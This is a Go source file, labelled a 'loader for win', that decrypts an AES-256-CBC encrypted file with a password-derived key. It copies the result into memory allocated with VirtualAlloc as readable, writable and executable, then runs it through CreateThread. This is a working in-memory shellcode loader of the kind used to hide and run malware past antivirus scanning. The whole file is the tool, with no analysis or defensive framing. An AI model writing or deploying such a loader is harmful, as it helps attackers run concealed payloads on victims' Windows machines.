// loader for win

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

// generateKey generates a 32-byte AES-256 key from a password.
func generateKey(password string) []byte {
	hash := sha256.Sum256([]byte(password))
	return hash[:]
}

// decryptData decrypts data using AES-256-CBC.
func decryptData(encryptedData, key, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	decrypted := make([]byte, len(encryptedData))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(decrypted, encryptedData)

	return decrypted, nil
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: loader <encrypted_binary> <password>")
		return
	}

	encryptedFile := os.Args[1]
	password := os.Args[2]

	// Read encrypted data from file
	encryptedData, err := os.ReadFile(encryptedFile)
	if err != nil {
		fmt.Println("Error reading encrypted file:", err)
		return
	}

	// Separate IV and encrypted content
	iv := encryptedData[:aes.BlockSize]
	ciphertext := encryptedData[aes.BlockSize:]

	key := generateKey(password)
	decryptedData, err := decryptData(ciphertext, key, iv)
	if err != nil {
		fmt.Println("Decryption failed:", err)
		return
	}

	// Allocate executable memory
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	ptr, _, err := virtualAlloc.Call(0, uintptr(len(decryptedData)), 0x3000, 0x40)
	if ptr == 0 {
		fmt.Println("VirtualAlloc failed:", err)
		return
	}

	// Copy decrypted binary to allocated memory
	copy((*[1 << 30]byte)(unsafe.Pointer(ptr))[:len(decryptedData)], decryptedData)

	// Create a thread to execute the binary
	createThread := kernel32.NewProc("CreateThread")
	thread, _, err := createThread.Call(0, 0, ptr, 0, 0, 0)
	if thread == 0 {
		fmt.Println("CreateThread failed:", err)
		return
	}

	// Wait for the thread to finish
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	waitForSingleObject.Call(thread, 0xFFFFFFFF)
}
